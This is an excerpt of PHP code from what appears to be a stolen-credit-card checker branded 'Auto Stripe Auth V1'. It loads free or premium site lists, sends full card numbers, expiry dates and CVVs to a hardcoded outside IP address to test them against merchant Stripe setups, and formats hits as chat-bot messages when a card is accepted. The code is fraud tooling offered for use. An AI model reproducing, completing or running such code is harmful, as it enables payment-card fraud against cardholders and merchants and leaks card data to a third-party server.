...
if ($sitePackage) {
    $packageFiles = [
        'free' => 'freesitesv1.txt',
        'premium' => 'premiumsitesv1.txt'
    ];
    $file = __DIR__ . '/' . ($packageFiles[$sitePackage] ?? 'freesitesv1.txt');
    if (!file_exists($file)) {
...
$requestUrl = "http://206.206.78.217:1011/?cc={$cc}|{$month}|{$year}|{$cvv}&getSite={$site}";
if ($proxyRequired) {
...
if ((stripos($response, 'Payment method successfully added.') !== false)) {
    ...
    $fullResult =
        ...
        "[ﾒ] <b>Response ➜</b> {$err} 🎉\n" .
        "[ﾒ] <b>Gateway ➜</b> Auto Stripe Auth V1\n" .
        "━━━━━━━━━━━\n" .
